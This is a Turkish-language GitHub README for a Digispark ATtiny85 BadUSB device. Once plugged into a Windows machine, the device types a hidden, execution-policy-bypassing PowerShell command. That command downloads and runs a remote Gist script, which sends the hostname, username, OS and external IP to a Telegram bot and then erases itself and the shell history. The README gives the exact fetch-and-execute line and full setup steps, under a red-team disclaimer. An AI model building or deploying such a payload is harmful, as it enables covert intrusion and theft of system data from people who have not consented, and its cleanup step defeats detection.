<div align="center">

# Digispark Telegram Payload

**`BadUSB Payload · Digispark (ATtiny85) · Telegram Bildirim`**

<br>

[![Live Demo](https://img.shields.io/badge/🌐_Canlı_Demo-GitHub_Pages-1f6feb?style=for-the-badge)](https://eren-oztk.github.io/digispark-telegram-payload-/)
[![Language](https://img.shields.io/badge/C++-100%25-00599C?style=for-the-badge&logo=cplusplus)](https://github.com/Eren-Oztk/digispark-telegram-payload)
[![Platform](https://img.shields.io/badge/Digispark-ATtiny85-red?style=for-the-badge)](https://github.com/Eren-Oztk/digispark-telegram-payload)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

</div>

---

> ⚠️ **YASAL UYARI:** Bu proje tamamen siber güvenlik araştırmaları (Red Teaming) ve eğitim amaçlı geliştirilmiştir. Kötüye kullanımından doğacak hiçbir yasal sorumluluk geliştiriciye ait değildir. Yalnızca izinli sistemlerde ve kendi ağlarınızda test ediniz. İzinsiz kullanım yasalara aykırıdır.

---

**Versiyon:** v1.0.0

**TR:** Digispark ATtiny85 tabanlı BadUSB payloadu — hedef bilgisayara takılınca sistem bilgisini Telegram'a iletir.

**EN:** Digispark ATtiny85 BadUSB payload that silently collects and sends system info to Telegram.

---

## 🎯 Ne Yapar ve Özellikleri Nelerdir?

**DigiDrop-PS**, siber güvenlik uzmanlarının (Red Team) fiziksel erişim senaryolarında HID (Human Interface Device) saldırılarını simüle etmeleri için tasarlanmış bir BadUSB payload aracıdır. Digispark (ATTINY85) kullanarak kendini bir klavye gibi tanıtır, Windows sistemlerde saniyeler içinde gizli bir PowerShell oturumu açar ve uzak bir sunucudan (örn. GitHub Gist) hedeflenen scripti indirip çalıştırır.

Digispark, USB'ye takıldığında kendisini bir klavye olarak tanıtır ve otomatik olarak gizli bir PowerShell penceresi açar. Uzak bir script çalıştırarak bilgisayar adı, kullanıcı adı, işletim sistemi ve dış IP adresini toplar; bunları Telegram bot üzerinden belirtilen sohbete gönderir. İşlem tamamlandığında PowerShell penceresi iz bırakmadan kapanır.

* **Stealth (Gizli) Mod:** PowerShell'i `-w hidden` parametresi ile açarak kurbanın ekranında minimum iz bırakır.
* **Execution Policy Bypass:** Güvenlik politikalarını geçici olarak (`-ep bypass`) aşar.
* **Otomatik Temizlik:** Script kendini ve PowerShell geçmişini temizler.
* **Türkçe Klavye Desteği:** `kbd_tr_tr` modülü ile TR Q klavyelerde sorunsuz çalışır.

## Nasıl Çalışır?

1. Digispark USB'ye takılır, 2 saniye bekler (sistem hazırlık süresi)
2. `Win + R` kısayoluyla Çalıştır penceresi açılır
3. `powershell` yazılır ve Enter'a basılır
4. Gizli (`-w hidden`) ve bypass modunda bir PowerShell komutu çalıştırılır
5. Uzak Gist'ten `ps1.txt` scripti indirilip çalıştırılır
6. Script; hostname, kullanıcı, OS ve IP bilgisini Telegram'a gönderir
7. Script kendini ve PowerShell geçmişini temizler
8. `exit` ile PowerShell kapatılır

## Donanım / Gereksinimler

| Bileşen | Açıklama |
|---|---|
| Digispark ATtiny85 | BadUSB görevi gören mikrodenetleyici |
| Hedef bilgisayar | Windows, internet bağlantısı gerekli |
| Telegram Bot | BotFather üzerinden oluşturulmuş token |

## Kurulum

### 1. Arduino IDE Hazırlığı

Arduino IDE'de Digispark board desteği ekle:

```
Dosya → Tercihler → Ek Board URL:
http://digistump.com/package_digistump_index.json
```

Board Manager'dan `Digistump AVR Boards` kur.

### 2. PowerShell Scriptini Hazırla

`secrets.example.ps1` dosyasını kopyala ve düzenle:

```bash
cp secrets.example.ps1 ps1.txt
```

`ps1.txt` içinde:
- `YOUR_BOT_TOKEN` → BotFather'dan aldığın token (`/newbot`)
- `YOUR_CHAT_ID` → `@userinfobot`'tan öğrendiğin chat ID

Bu scripti bir GitHub Gist olarak **public** yükle ve raw URL'sini al.

### 3. .ino Dosyasını Güncelle

`DigisparkTelegramPayload.ino.ino` içindeki Gist URL'sini kendi raw Gist URL'nle değiştir:

```cpp
DigiKeyboard.print("powershell -w hidden -ep bypass -c \"iex (iwr -UseBasicParsing 'RAW_GIST_URL_BURAYA')\"");
```

### 4. Kodu Yükle

Arduino IDE'de `Tools → Board → Digispark (Default - 16.5MHz)` seç, yükle. İstendiğinde Digispark'ı USB'ye tak.

## Bağımlılıklar

| Kütüphane | Sürüm | Kaynak |
|---|---|---|
| DigiKeyboard | Digistump AVR Boards ile gelir | Board Manager |

## Bilinen Limitasyonlar

- Hedef bilgisayarın internet bağlantısı olması gerekir
- Windows Defender veya EDR çözümleri scripti engelleyebilir
- `kbd_tr_tr` layout tanımlanmış; farklı klavye düzeni için değiştir
- Gist URL değişirse `.ino` yeniden derlenmeli

## Lisans

Bu proje MIT Lisansı altında açık kaynak olarak paylaşılmıştır. Etik sınırlar çerçevesinde dilediğiniz gibi geliştirebilir, çatallayabilir (fork) ve katkıda bulunabilirsiniz.
[MIT](LICENSE) © 2025 Eren Öztürk
